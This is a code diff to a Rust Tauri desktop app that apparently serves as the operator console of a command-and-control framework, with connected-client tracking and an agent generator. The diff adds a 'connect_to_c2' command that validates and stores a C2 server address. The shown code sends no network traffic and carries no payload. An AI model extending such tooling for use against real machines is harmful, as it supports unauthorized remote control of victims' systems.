@@ -7,6 +7,8 @@ mod embedded_agent;
 pub struct AppState {
     pub clients: Arc<Mutex<Vec<String>>>,
     pub logs: Arc<Mutex<Vec<String>>>,
+    pub c2_address: Arc<Mutex<Option<String>>>,
+    pub c2_configured: Arc<Mutex<bool>>,
 }
 
 impl Default for AppState {
@@ -14,6 +16,8 @@ impl Default for AppState {
         Self {
             clients: Arc::new(Mutex::new(vec![])),
             logs: Arc::new(Mutex::new(vec!["System initialized...".to_string()])),
+            c2_address: Arc::new(Mutex::new(None)),
+            c2_configured: Arc::new(Mutex::new(false)),
         }
     }
 }
@@ -69,6 +73,75 @@ fn get_clients(state: tauri::State<'_, AppState>) -> Vec<String> {
 fn get_logs(state: tauri::State<'_, AppState>) -> Vec<String> {
     let logs = state.logs.lock().expect("AppState lock poisoned");
     logs.clone()
+}
+
+#[derive(serde::Serialize)]
+struct ConnectResult {
+    success: bool,
+    message: String,
+}
+
+#[tauri::command]
+fn connect_to_c2(state: tauri::State<'_, AppState>, address: String) -> ConnectResult {
+    // Validate the address format — must be host:port
+    let trimmed = address.trim();
+    if trimmed.is_empty() {
+        return ConnectResult {
+            success: false,
+            message: "Address cannot be empty".to_string(),
+        };
+    }
+
+    // Basic host:port validation
+    let parts: Vec<&str> = trimmed.split(':').collect();
+    if parts.len() != 2 {
+        return ConnectResult {
+            success: false,
+            message: "Invalid address format. Use host:port (e.g. 10.0.0.1:9000)".to_string(),
+        };
+    }
+
+    let port_str = parts[1];
+    if port_str.is_empty() || !port_str.chars().all(|c| c.is_ascii_digit()) {
+        return ConnectResult {
+            success: false,
+            message: "Port must be a number".to_string(),
+        };
+    }
+
+    let port: u16 = match port_str.parse() {
+        Ok(p) => p,
+        Err(_) => {
+            return ConnectResult {
+                success: false,
+                message: "Invalid port number".to_string(),
+            };
+        }
+    };
+
+    if port == 0 {
+        return ConnectResult {
+            success: false,
+            message: "Port must be greater than 0".to_string(),
+        };
+    }
+
+    let msg = format!("C2 server configured: {trimmed}");
+    {
+        let mut addr = state.c2_address.lock().expect("AppState lock poisoned");
+        *addr = Some(trimmed.to_string());
+    }
+    {
+        let mut configured = state.c2_configured.lock().expect("AppState lock poisoned");
+        *configured = true;
+    }
+    state.add_log(&msg);
+    log::info!("{msg}");
+
+    ConnectResult {
+        success: true,
+        message: msg,
+    }
 }
 
 #[derive(serde::Serialize)]
@@ -193,6 +266,7 @@ fn main() {
             get_clients,
             get_logs,
             generate_agent,
+            connect_to_c2,
         ])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
